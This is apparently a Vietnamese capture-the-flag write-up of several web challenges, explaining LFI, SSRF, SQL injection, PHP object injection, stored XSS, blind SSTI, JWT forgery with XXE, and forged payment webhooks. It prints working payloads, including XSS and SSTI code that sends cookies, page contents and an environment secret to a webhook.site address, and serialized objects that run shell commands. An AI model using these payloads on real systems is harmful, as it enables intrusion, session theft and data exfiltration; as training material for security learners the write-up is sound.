
# WEB
## Santa's Shop
![image](https://hackmd.io/_uploads/SkgODOhGZe.png)

Bài này khá phức tạp và rối lúc ban đầu💀💀, cần thủ thuật Ctrl + U để xem mà nguồn và bùm:
![image](https://hackmd.io/_uploads/BydJOO2M-g.png)



---

## Santa's Shop Revenge
![image](https://hackmd.io/_uploads/HyBtX-2zZg.png)
#### Thu thập thông tin
Với chall này, ta đăng kí `/register.php` và đăng nhập `/login.php` như bình thường 


Khi vào đăng nhập thành công, ta thấy phần Nạp tiền không được sử dụng, phần Admin Dashboard cho ta một gợi ý: 

![image](https://hackmd.io/_uploads/rkEZYZhMbg.png)


Mystery Gift Box có giá vượt số xu mình có, nên 99,36% thứ ta cần khai thác là việc nạp coin mà mua nó

![image](https://hackmd.io/_uploads/HynjIWhfZe.png)

Qua Burp, ta thấy website sử dụng endpoint `/file.php` để hiển thị ảnh thông qua tham số `image`, nhưng việc thiếu validation có thể dẫn đến lỗ hổng Path Traversal, Local File Inclusion hoặc  Sever-side Request Forgery
![image](https://hackmd.io/_uploads/H1UFhWnfbg.png)

#### Khai thác lỗ hổng
Thử với giá trị bất kì, backend đưa những gì mình nhập vào thẳng hàm `file_get_contents` cùng thông tin về thư mục mà ta đang đứng: `/var/www/html/file.php`
![image](https://hackmd.io/_uploads/BJLUA-hMZe.png)
Thử lùi về thư mục gốc `/var/www/html` , nhận thấy ứng dụng web đã có input validation với các đường dẫn tương đối
![image](https://hackmd.io/_uploads/rJl8JM2Gbe.png)
Thử với đường dẫn tuyệt đối `/etc/passwd`, nhận được
![image](https://hackmd.io/_uploads/S1R5gM2M-g.png)

$\Rightarrow$ Web dính lỗi LFI dù đã có bộ lọc để để chặn các ký tự Path Traversal (../../)

 Với lỗ hổng này, ta hoàn toàn có thể đọc source code của `/admin.php` chứ??
 Sử dụng đường dẫn tuyệt đối vào thư mục `/var/www/html/admin.php`, ta nhận được:
 ![image](https://hackmd.io/_uploads/HkUXBG3zWl.png)
 $\Rightarrow$ Nghĩ tới việc dùng bộ lọc php wrapper để nhận được source code đã base64 và đem đi decode

```php!
<?php
require_once 'config.php';
$secret = trim(file_get_contents("/secret.txt"));
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    // http_response_code(403);
    die("Chỉ có thể cập nhật coin từ localhost !");
}

if (!isset($_GET['username']) || !isset($_GET['coin']) || !isset($_GET['secret'])) {
    die("Vui lòng nhập username, coin và SECRET");
}

if ($secret !== $_GET['secret']){
    die("SECRET bạn nhập không chính xác.");
}

$username = trim($_GET['username']);
$coin = (int)$_GET['coin'];

try {
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        die("Không tìm thấy user: " . htmlspecialchars($username));
    }

    $stmt = $conn->prepare("UPDATE users SET coin = ? WHERE username = ?");
    $stmt->execute([$coin, $username]);

    echo "Đã cập nhật coin cho <b>{$username}</b> thành <b>{$coin}</b>!";
} catch (PDOException $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}

?>
```





  Quá rõ ràng, ta tận dụng biến `image` request đến localhost (127.0.0.1) chứa endpoint `/admin.php` kèm biến `username`, `coin` do ta nhập và `secret` lấy từ việc khai thác LFI với file `/secret.txt` để hack xu
  $\implies$ **SSRF**
  ![image](https://hackmd.io/_uploads/S1zK5f3Mbx.png)
Có payload như sau `http://127.0.0.1/admin.php?username=kcsckma&coin=999936&secret=ChiCon1BuocNuaThoi~_~` 

![image](https://hackmd.io/_uploads/HklYjfnzWl.png)

Việc còn lại chỉ là <kbd>F5</kbd> và mua món quà bí ẩn thôi <3

![image](https://hackmd.io/_uploads/r1fJhMnf-e.png)


 

---

 
## Secure Store
![image](https://hackmd.io/_uploads/r1G3az2Mbl.png)
#### Thu thập thông tin

Phân tích suộc, ta có file `guard.js` tồn tại một lỗ hổng SQL injection tiềm năng ở biến `code`: 
```js
async function checkVoucher(code) {
    try {
        if (code.length > 18) return 'Invalid voucher code.'
        const query = `SELECT * FROM Voucher WHERE code = '${code}'`;

        const vouchers = await db.query(query);

        if (vouchers.length > 0) {
            const discount = vouchers[0].discount || 0
            return `Voucher valid! Discount: ${discount}%`;
        } else {
            return 'Invalid voucher code.';
        }
    } catch (error) {
        console.error(error);
        return 'Database error occurred.';
    }
}
```
 Dù có bộ lọc giới hạn số kí tự dưới 18 nhưng biến `code` được đưa trực tiếp vào câu lệnh query về database. Ta thử `?code='+OR+1=1+--+`
 
![image](https://hackmd.io/_uploads/Hy9WBmnMbe.png)

$\Rightarrow$ **SQL injection**
#### Khai thác

Việc tiếp theo là tìm cách bypass bộ lọc kí tự này:
`if (code.length > 18) return 'Invalid voucher code.'`
Ở đây, biến `code` không hề được khai báo kiểu dữ liệu cố định, có thể là chuỗi, số, hoặc object...
Ta thử biến `code` thành một biến dạng mảng (khá hay), kết hợp suộc `/schema.prisma`
```
model Voucher {
  id    Int     @id @default(autoincrement())
  code  String
  discount Int
}
```
Sử dụng `?code[]='+union+select+1,2,3--+-`
![image](https://hackmd.io/_uploads/BJvccX3z-x.png)

Đến đây ta có thể tận dụng SQLMap nhằm tự động tìm ra thông tin về db khi đã có tham số code để khai thác


Lệnh hoàn chỉnh:
```
sqlmap -u "http://67.223.119.69:5020/api/check-voucher?code[]=1" -p code[] --batch --dump --dbs --tables --level=5 --risk=3
```
  - -p chỉ định parameter cụ thể để test
  - --batch nhằm bỏ qua y/n
  - --dump để hiện thị đủ thông tin
  - --dbs -tables nhằm liệt kê db, bảng
  - --level -risk tăng 'sát thương' cho việc testing 
![image](https://hackmd.io/_uploads/BJb6mE3zZe.png)
Đây là db mà ta cần khai thác, sửa lệnh sqlmap để target vào db `store` là xong
```
sqlmap -u "http://67.223.119.69:5020/api/check-voucher?code[]=1" -p code[] --batch --dump -D store --tables --columns
```
![image](https://hackmd.io/_uploads/SyIUE4nf-e.png)

*//Khi trước tag "-p" mình quên thêm [] cho biến `code` nên chạy tốn thời gian mà sqlmap báo biến này không injectable😞*

---



## Bảy Viên Bi Rồng
![image](https://hackmd.io/_uploads/rkQP-V3fbg.png)
### Thu thập thông tin
Ở `config.php`, ta có hàm như sau:
```php
function getCurrentUser() {
    if (!isset($_COOKIE[COOKIE_NAME])) return null;

    $data = base64_decode($_COOKIE[COOKIE_NAME]);
    if ($data === false) return null;

    $user = @unserialize($data);
    if (!$user instanceof User) return null;
    if ($user->dragon_balls > 7) {
        $user->dragon_balls = 7;
    }
    return $user;
}
```
Trong hàm này, unserialize() được sử dụng trực tiếp lên cookie và gán trực tiếp thuộc tính cho người dùng, ctfer có thể đưa cookie tuỳ ý vào thông qua DevTool
Xem thử cookie khi đã base64-decode như sau: 
```te!
O:4:"User":7:{s:8:"username";s:10:"tnguyen123";s:8:"password";s:10:"tnguyen123";s:13:"register_date";s:19:"2025-12-14 13:21:27";s:15:"attendance_days";i:1;s:12:"dragon_balls";i:0;s:15:"last_attendance";s:10:"2025-12-14";s:18:"shenron_connection";N;}
```
Đây là các object được Serialization(Tuần tự hoá)
Ta thử thay đổi `dragon_ball` và `attendance_days` đều thành 7, đem đi base64-encode và ta được: 
![image](https://hackmd.io/_uploads/BJJfa43Gbx.png)
$\implies$ Lỗ hỗng PHP Object Injection

Đều này chứng tỏ ta có thể chỉnh sửa, thêm bớt Object có trong cookie
Đặc biệt, trong `/Wish.php` tồn tại hàm grant cho phép thực thi lệnh tùy ý thông qua `$(this->callback)($this->content)`
```php!
<?php
class Wish {
    public $content;   
    public $callback;   

    public function __toString() {
        return $this->content ?? '';
    }

    public function grant() {
        if ($this->callback && $this->content) {
            return ($this->callback)($this->content);
        }
        return false;
    }
}
?>
```
Và hàm `__destruct` trong `Shenron.php` tự động chạy khi object bị hủy
$\implies$ Nếu `$balls_collected === 7` VÀ `$current_wish` là object `Wish` $\to$ Gọi hàm grant()
```tex!
public function __destruct() {
        if ($this->balls_collected === 7 && $this->current_wish instanceof Wish) {
            $this->summoned_at = date('Y-m-d H:i:s');
            $this->current_wish->grant();
        }
    }
```
### Khai thác
Trong cookie, biến `$shenron_connection` được khởi tạo là `null`,ta cần sửa `;N` thành `;O:` để thêm Object `Shenron` và lồng thêm Object `Wish` bên trong. 
Đồng thời, khai báo các biến được liệt kê trong `Wish.php` và `Shenron.php`
Ta set `$callback` = "system" và `$content` = "cat /flag.txt" sẽ tạo nên lệnh nối chuỗi
Thay đổi `$last_attendance` và `$attendance_days` để khớp với logic trong `User.php`
```tex!
O:4:"User":7:{s:8:"username";s:10:"tnguyen123";s:8:"password";s:10:"tnguyen123";s:13:"register_date";s:19:"2025-12-14 13:21:27";s:15:"attendance_days";i:49;s:12:"dragon_balls";i:7;s:15:"last_attendance";s:0:"";s:18:"shenron_connection";O:7:"Shenron":3:{s:15:"balls_collected";i:7;s:12:"current_wish";O:4:"Wish":2:{s:7:"content";s:8:"ls -la /";s:8:"callback";s:8:"system";}s:11:"summoned_at";N;}}
```
![image](https://hackmd.io/_uploads/B1o8BBhGZx.png)

Cuối cùng, sửa `$content` thanh "cat /flag.txt" và sửa độ dài của biến từ 8 $\to$ 13 là ta có thể thu được flag🥶 
> KCSC{Sh3nR0n_S4ys_y0Ur_w1sh_f0R_rc3_1s_Gr4Nt3d_M4sT3r!!}


---


## Hori's Blog
![image](https://hackmd.io/_uploads/SJMRbv2fbx.png)
### Thu thập thông tin
Với giao diện có tính năng đăng bài viết kèm file, ta có thể suy đoán lỗ hổng là File Upload hoặc Insecure Direct Object Reference.
Nhưng đã có hint rằng chall này không liên quan đến file upload, ta nghiêng về IDOR
![image](https://hackmd.io/_uploads/SyYDQw2M-x.png)
Thế nhưng biến id này có vẻ không khai thác được do chỉ có 2 tham chiếu khác là `?id=1` và `?id=2` là hai bài viết mặc định của web
Ta chuyển nghi ngờ sang con bot gọi đến `/endpoint.php`
Kết hợp với hint rằng flag ở cookie, ta có thể mượn bot để lấy cookie admin chẳng hạn?

Ta thử với lệnh js đơn giản `<script>alert(1)</script>` 

![image](https://hackmd.io/_uploads/r13NBD2G-g.png)

$\implies$ `/view.php?id=....` chính là nơi ta cần con bot gọi đến để thực thi payload
Đưa các endpoint của các bài viết khác nhau thì kết quả chỉ trả ra một dòng duy nhất:

![image](https://hackmd.io/_uploads/ByGeID2z-x.png)

$\implies$ **Stored XSS** (do payload được lưu trên server)

### Khai thác

Ta buộc phải dùng một kênh thứ 3 (Out-of-Band) để hứng các tín hiệu ta gửi đi
Tạo post chứa lệnh js mới để gửi cookie sang cho webhook:
```
<img src="x" onerror="window.location='https://webhook.site/783debd3-b12d-49b8-a99d-43baf57caafb?c='+document.cookie">
```
Sau khi nhờ bot "ghé thăm" endpoint thì: 

![image](https://hackmd.io/_uploads/Hk7ndwnfZx.png)

Vậy cookie chứa flag đã được set cờ HttpOnly. Trình duyệt bảo mật không cho phép JavaScript đọc loại cookie này

Ta sẽ bắt con bot thực hiện request tới /phpinfo.php để lấy nội dung trang đó kèm cookie. Vì HttpOnly chỉ chặn JavaScript đọc, nhưng không chặn trình duyệt gửi đi

Payload: (AI-generated)
```script!
<script>fetch('/phpinfo.php').then(r=>r.text()).then(c=>{let i=c.indexOf('KCSC');let s=(i!==-1)?c.substring(Math.max(0,i-50),i+250):'KCSC_NOT_FOUND';window.location='https://webhook.site/783debd3-b12d-49b8-a99d-43baf57caafb?d='+btoa(s)}).catch(e=>{window.location='https://webhook.site/783debd3-b12d-49b8-a99d-43baf57caafb?error='+e});</script>
```
- Mục đích: lấy nội dung trang cấu hình PHP, tìm vị trí của chuỗi chứa "..KCSC..", cắt lấy vị trí bao quanh, base64-encode(do chứa các kí tự nhạy cảm) rồi gửi qua webhook 

![image](https://hackmd.io/_uploads/ryCA2wnfWe.png)


---


## Simple Web
![image](https://hackmd.io/_uploads/Hyho6wnz-g.png)

Với gợi ý từ author đẹp zai😋 ta có được khái niệm về chuẩn hoá unicode, sử dụng tên `ａdmin` với chữ a đầu tiên là ký tự Fullwidth để khi backend lưu trữ tên được chuẩn hóa thành `admin` với mật khẩu tuỳ chọn

Khi đăng nhập, ta dùng `admin` đã được chuẩn hoá:

![image](https://hackmd.io/_uploads/rysWZdnfWl.png)


Khi vào được trong web, ta thấy các nút đều disable (trừ logout) và nhận thêm một hint: ![image](https://hackmd.io/_uploads/HJbO-uhzbl.png)

$\implies$ SSRF again

Ta nghĩ ngay đến việc điền `http://127.0.0.1/flag` hoặc `http://localhost/flag` 
Ta lập tức có thêm một hint mới như sau:
![image](https://hackmd.io/_uploads/H1eczd2M-e.png)

- Thử nghiệm với Path Traversal `http://localhost/../../flag`, nhận được lời khước từ "No no! Path traversal detected"

- Tiếp tục với `http://localhost:5021/./flag` và`http://localhost/?file=/flag` lẫn `http://localhost/ｆｌａｇ` đều không khả thi
- Thay đổi kiểu chữ `http://localhost/FLAG`, `http://localhost/FlAg` vẫn chưa được
- Sử dụng query string giả `http://localhost/flag?` $\to$ bất ngờ thành công lấy được flag (☞ﾟヮﾟ)☞
$\implies$ Server sử dụng bộ lọc /flag để ta không tiếp cận trực tiếp. Khi bypass được nó, cùng với query (rỗng), server trả về nội dung file `/flag`
$\implies$ Lần sau hãy thử làm rối mã
> KCSC{Y0u_kn0w_uRl_Globbing}



---

## silver
![image](https://hackmd.io/_uploads/SksVs_nGWg.png)

Ta nhận thấy phần `/report` có chức năng gửi đi URL để admin check, ta có thể sử dụng nó để gửi admin's cookie về phía mình
Thử với 
```
http://localhost:5000/home?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```
Có vẻ ta lại gặp lỗ hổng Blind XSS khi server chỉ trả mình dòng
![image](https://hackmd.io/_uploads/rJgtZthMZe.png)

Tiếp tục với cách tiếp cận như các chall ở trên(Out-of-band): dùng webhook để hứng cookie của admin, thực thi mã động với sự kiện `onerror`
```
http://localhost:5000/home?name=%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2Fwebhook.site%2F783debd3-b12d-49b8-a99d-43baf57caafb%3Fc%3D%27%2Bdocument.cookie%22%3E
```
$\to$ nhận được cookie $\to$ mở DevTools và nhập $\to$ <kbd>F5</kbd> $\to$ có quyền admin
Với hai chức năng mới, tải file `backup` để đọc suộc, và `data generator` 'có thể' là chìa khoá để tìm flag
![image](https://hackmd.io/_uploads/rkki7K2M-g.png)

Khi đã tải và giải nén suộc, ta nhận được `app.py` với hàm thực hiện chức năng report generator 

<details> 
    <summary>app.py</summary>
    
@app.route('/admin/report-generator', methods=['GET', 'POST'])
@admin_required
def report_generator():
    if request.method == 'GET':
        return render_template('report_generator.html')
    
    data = request.json
    template_content = data.get('template', '')
    
    if not template_content:
        return jsonify({'error': 'Template content is required'}), 400

    if len(template_content) > 55:
        return jsonify({'error': 'Template too long (max 55 chars)'}), 400

    try:
        render_template_string(template_content)
    except Exception:
        pass
    
    return jsonify({
        'success': True,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }), 200

</details>
- Hàm `render_template_string()` khiến ta rấy lên nghi ngờ về việc web dính thêm lỗ hổng Server-side Template Injection. *(Hàm nhận vào một string và xử lý nó như một template)*
- Hơn nữa ở cuối việc chỉ trả về "true" và ngày tháng tạo report khiến đây trở thành Blind SSTI và ta tiếp tục phải nhờ webhook

- `if len(template_content) > 55:` đây chính là cái gai trong mắt chúng ta khi giới hạn độ dài payload để inject mã thực thi

$\implies$ Sử dụng Console để gửi custom request: inject payload vào chuỗi truy vấn để bypass check độ dài, thay vì nhập trực tiếp vào input bị giới hạn 

Payload: (AI-generated...)
```javascript!
const webhook = "https://webhook.site/783debd3-b12d-49b8-a99d-43baf57caafb";
const cmd = `python -c "import os,urllib.request; urllib.request.urlopen('${webhook}/?flag='+os.environ['FLAG'])"`;

fetch('/admin/report-generator?cmd=' + encodeURIComponent(cmd), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
   //gọi hàm os.popen, cho phép thực thi bất kỳ lệnh shell nào được truyền qua ?cmd
    "template": "                          {{url_for.__globals__.os.popen(request.args.cmd)}}"
    })
}).then(r => console.log("✅ Đã phóng Payload. Hãy qua Webhook kiểm tra ngay!"));
```
*//Mình đã mắc một lỗi rất ngáo, đó là đâm đầu vào việc ghi vào file .zip để tải về mà không nghĩ đến việc sử dụng webhook 1 lần nữa. Ở Dockerfile đã giới hạn quyền ghi file chỉ cho / (root) làm mình kẹt trong bài này rất khá lâu💔*
![image](https://hackmd.io/_uploads/HkhiX76zWe.png)




---
## Ka Cê Ét Cê 

![image](https://hackmd.io/_uploads/SkwEp4b7Zg.png)

```php!
<?php
require_once __DIR__ . '/../utils/JWT.php';

$result = new stdClass;

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    $result->message = "Only POST!";
} else {
    try {
        $data = json_decode(file_get_contents('php://input'), true);
        $username = $data['username'] ?? NULL;
        $password = $data['password'] ?? NULL;

        if ($username === NULL || $password === NULL) {
            $result->message = 'Please provide your username and password!';
        } else if ($username === 'admin' && $password === getenv('ADMIN_PASSWORD')) {
            $result->message = 'Oh, Welcome admin!';
            $result->token = JWT::generateToken(['username' => 'admin', 'role' => 'admin']);
        } else {
            $result->message = 'Hello, CTFer!';
            $result->token = JWT::generateToken(['username' => $username, 'role' => 'ctfer']);
        }
    } catch (\Throwable $th) {
    }
}

echo json_encode($result);
```
Khi nhìn vào suộc code, ta thấy được một endpoint `.../api/login.php` cho phép ta đăng nhập, trả ra một chuỗi encoded token chứa thông tin về `username` và `role` của mình
Tiến hành đăng nhập với method `POST`, body chứa json của `username` và `password`
Ta nhận được:
```
{"message":"Hello, CTFer!","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5ndXllbm50Iiwicm9sZSI6ImN0ZmVyIiwiaWF0IjoxNzY2MDMxNjg4LCJleHAiOjE3NjYwMzUyODh9.AxljPxg5ajcQQPPnO9iCxeuKcrClH7dO4hHLVbuC5HQ"}
```
Đem token đi decode, cùng với gợi ý về việc ghi tên mình vào danh sách thành viên clb, ta đọc suộc code của `.../api/members/update.php` 
    
```php
<?php
require_once __DIR__ . '/../../utils/JWT.php';
require_once __DIR__ . '/../../utils/KCSC.php';

$result = new stdClass;
$kcsc = new KCSC;

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    $result->message = 'Only POST request!';
} else {
    $token = $_COOKIE['token'] ?? null;
    if (is_null($token)) {
        http_response_code(401);
        $result->message = 'Please provide cookie token!';
    } else if (!$kcsc->isAdmin($token)) {
        http_response_code(403);
        $result->message = 'You are not admin!';
    } else {
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);

        if (!isset($data['xml_content'])) {
            http_response_code(400);
            $result->message = 'Missing xml_content parameter!';
        } else {
            $xml_content = $data['xml_content'];
            $updateResult = $kcsc->update_members($xml_content);

            if ($updateResult['success']) {
                $result->message = $updateResult['message'];
            } else {
                http_response_code(400);
                $result->message = $updateResult['message'];
                if (isset($updateResult['errors'])) {
                    $result->errors = $updateResult['errors'];
                }
            }
        }
    }
}

echo json_encode($result);
```


Ở đây hàm `isAdmin` chỉ kiểm tra `role` của mình nên khi decode token, ta đổi `role` từ 'ctfer' thành 'admin' và đem đi encode trở lại (sử dụng jwt.io nhằm thay đổi cả chân chữ kí)
Khi vào endpoint để update thành viên, tiếp tục dùng method `POST`, thêm vào đó, ta sẽ đưa Header `Cookie` vào request với giá trị mà ta vừa có được khi encode token
![image](https://hackmd.io/_uploads/Byo57G-QWg.png)
Mình đã gửi được một đoạn XML thông thường, có thể ta sẽ khai thác được lỗ hổng XXE bằng cách có khai báo DOCTYPE và ENTITY để yêu cầu server đọc file bên ngoài
![image](https://hackmd.io/_uploads/H1K3-7b7-g.png)
$\implies$ Thành công trigger XXE
Khi đã thử với giao thức `file://` để đọc những file khác và thất bại, ta chuyển hướng sang việc dùng `php wrapper` nhằm bypass việc một số kí tự đặc biệt bị giới hạn, không được xuất hiện và nhận lại một chuỗi đã được base64
```
"message":"Invalid XML format: Char 0x0 out of allowed range\n"
```
Khi check Dockerfile trong suộc, ta thấy được dòng
```
CMD ["sh", "-c", "mv /flag.txt /flag_REDACTED.txt && php-fpm && tail -f /dev/null"]
```
Vậy flag tồn tại dưới dạng một file trong container, ban đầu có tên là `/flag.txt`. Tuy nhiên, khi container khởi động, file này bị đổi tên sang một tên khác đã bị che (REDACTED). Container được khởi động thông qua `sh -c`, vì vậy toàn bộ câu lệnh khởi động của container có thể bị lộ thông qua file `/proc/1/cmdline`
![image](https://hackmd.io/_uploads/rJvQd4-X-l.png)
Đem đi decode, ta được:
```
sh�-c�mv /flag.txt /flag_f46ef942743225f094999b26af3080d0.txt && php-fpm -D && httpd -D FOREGROUND && tail -f /dev/null�
```
Một lần nữa sử dụng giao thức `file://` khi đã biết chính xác tên flag được khi web được build 
![image](https://hackmd.io/_uploads/Hy8pONWQZe.png)
> KCSC{0hh_w40000_chuc_mun9_b4n_d4_7r0_7h4nh_m07_7h4nh_v13n_cu4_kc5c_nh0000}



---

# MISC
## KCSC order
Khi thử các endpoint với lỗ hổng SQLi:
`/cart?error=invalid_voucher`
`/orders/view?id=167`
`/combos/options?id=2`
Ta đều thất bại, ta thử với việc thao túng giá trị  `price` trong body của Request thành 0 khi thêm Flag vào giỏ hàng nhưng không đạt được mục đích
```
id=8&type=food&name=FLAG&price=99000000.00&quantity=1&csrf_token=c4d476fb7c903ba8323eb1e390d1515e014ebe2cc5f46122aca6c8c995f59563
``` 

Mình dùng `dirsearch` mong tìm ra một enpoint mới với 1 cách khai thác mới
Ta nhận được 1 endpoint lạ: `/UPDATE.txt`
![image](https://hackmd.io/_uploads/S1rCcMOX-g.png)
![image](https://hackmd.io/_uploads/BJIxzQuX-e.png)


Ta có `/payment/webhook` là nơi server nhận thông báo từ cổng thanh toán, kiểm tra số lượng mua, cập nhật trạng thái đặt hàng thành 'paid' nếu mua thành công
Việc kiểm tra chữ kí webhook hiện đang được hoàn thành (ta chắc chắn sẽ khai thác được nhờ lỗ hổng nghiêm trọng này)
### Khai thác
![image](https://hackmd.io/_uploads/ByYZ3BO7We.png)

Khi thực hiện mua flag, Burp liên tục bắt các gói tin trong quá trình thanh toán. trình duyệt gửi request đến server của PayOS 
Vô tình response đã tiết lộ cấu trúc JSON chuẩn: 
```json!
{
 "code":"00",
 "desc":"success",
 "data":{
     "status":"PENDING",
     "amountRemaining":99000000
  }
}
```
Ta gửi request với method POST đến endpoint `/payment/webhook` với 
- body là JSON như trên
- thay đổi `status` về 'PAID' 
- `amountRemaing` thành 0 
- `Content-Type` thành 'json/application'
-  `signature` với giá trị tuỳ ý (do tính năng này đang được hoàn thiện, có thể server sẽ bỏ qua)

<details>
<summary>Body1</summary>
  
{"code":"00","desc":"success","data":{"status":"PAID","amountRemaining":0},
"signature":"mixinhgai"}

</details>

Ta nhận được: 
```json
{
    "success":false,
    "message":"Order not found"
}
```
$\implies$ Không xác định được đơn hàng, server cập nhật trạng thái thanh toán thẳng vào db
Xem lại Header `Referer` của Request đến PayOS, ta thấy giá trị của `orderCode` mà ta cần bổ sung vào JSON

<details>
<summary>Body2</summary>
  
{"code":"00","desc":"success","data":{"status":"PAID","amountRemaining":0,
"orderCode":"174915434"},
"signature":"mixinhgai"}

</details>

Ta nhận được: 
```json
{    
    "success":false,
    "message":"Amount mismatch"
}
```
Như vậy, server so sánh `Amount` với giá trị món hàng ta muốn mua, ta cần bổ sung trường với thuộc tính tương ứng

![image](https://hackmd.io/_uploads/S1Oy-LumWl.png)
Thành công mua flag!!!
> KCSC{1337}
